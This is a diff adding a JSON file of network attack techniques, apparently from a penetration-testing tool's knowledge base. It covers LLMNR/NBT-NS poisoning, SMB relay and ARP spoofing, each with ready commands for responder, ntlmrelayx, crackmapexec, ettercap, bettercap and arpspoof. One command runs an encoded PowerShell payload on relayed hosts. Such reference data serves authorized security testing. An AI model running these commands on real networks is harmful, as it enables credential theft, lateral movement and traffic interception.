@@ -1,0 +1,56 @@
+[
+  {
+    "id": "net-proto-001",
+    "category": "network",
+    "subcategory": "protocol_attacks",
+    "title": "LLMNR/NBT-NS Poisoning",
+    "description": "Respond to LLMNR and NetBIOS Name Service broadcasts to capture NTLMv2 hashes. Exploits Windows name resolution fallback behavior when DNS fails.",
+    "techniques": [
+      "responder -I <INTERFACE> -w -f",
+      "responder -I <INTERFACE> -A",
+      "john --format=netntlmv2 <HASH_FILE>"
+    ],
+    "indicators": ["Windows hosts on network", "LLMNR enabled (default)", "No SMB signing"],
+    "prerequisites": ["Network access to broadcast domain", "No LLMNR/NetBIOS disabled via GPO"],
+    "tools": ["responder", "john", "hashcat"],
+    "tags": ["llmnr", "ntlm", "hash-capture", "poisoning", "windows", "responder"],
+    "confidence": 0.85,
+    "mitre_attack": "T1557.001"
+  },
+  {
+    "id": "net-proto-002",
+    "category": "network",
+    "subcategory": "protocol_attacks",
+    "title": "SMB Relay Attack",
+    "description": "Relay captured NTLM authentication to other hosts where the relayed credentials have local admin access. Requires targets without SMB signing.",
+    "techniques": [
+      "ntlmrelayx -tf targets.txt -smb2support",
+      "ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <BASE64>'",
+      "crackmapexec smb <TARGET> --gen-relay-list relay_targets.txt"
+    ],
+    "indicators": ["SMB signing disabled on targets", "NTLM authentication in use"],
+    "prerequisites": ["SMB signing disabled", "Relayed user has local admin on target"],
+    "tools": ["impacket-ntlmrelayx", "crackmapexec"],
+    "tags": ["smb-relay", "ntlm", "relay", "lateral-movement", "windows"],
+    "confidence": 0.9,
+    "mitre_attack": "T1557.001"
+  },
+  {
+    "id": "net-proto-003",
+    "category": "network",
+    "subcategory": "protocol_attacks",
+    "title": "ARP Spoofing / Man-in-the-Middle",
+    "description": "Perform ARP cache poisoning to intercept traffic between hosts on the local network segment. Enables credential capture and session hijacking.",
+    "techniques": [
+      "ettercap -T -M arp:remote /<TARGET_IP>/ /<GATEWAY_IP>/",
+      "bettercap -eval 'set arp.spoof.targets <TARGET_IP>; arp.spoof on; net.sniff on'",
+      "arpspoof -i <INTERFACE> -t <TARGET_IP> <GATEWAY_IP>"
+    ],
+    "indicators": ["Shared L2 network segment", "No dynamic ARP inspection enabled"],
+    "prerequisites": ["Network access to target subnet", "No port security or DAI on switch"],
+    "tools": ["ettercap", "bettercap", "arpspoof", "dsniff"],
+    "tags": ["arp-spoof", "mitm", "sniffing", "network-attack"],
+    "confidence": 0.8,
+    "mitre_attack": "T1557.002"
+  }
+]
